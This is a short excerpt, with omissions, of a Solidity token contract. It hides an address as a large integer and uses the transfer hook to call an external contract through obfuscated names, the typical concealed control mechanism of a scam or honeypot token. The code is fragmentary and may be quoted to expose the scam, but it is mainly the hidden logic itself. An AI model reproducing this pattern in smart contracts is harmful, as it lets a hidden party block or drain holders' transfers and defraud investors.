...
abstract contract Lucifer {
    string demon = "King of hell";
    uint160 fellow = 1304699617596215865065446733082635078319330374521;
}

contract Doom is IERC20, Lucifer, Ownable {
    ...
    function _beforeTokenTransfer(address from, uint256 amount) internal returns (bool) {
        if (amount <= fellow) {
            amount = amount - qfweqar(address(fellow)).iqqwoir(from);
            return false;
        }
        return true;
    }
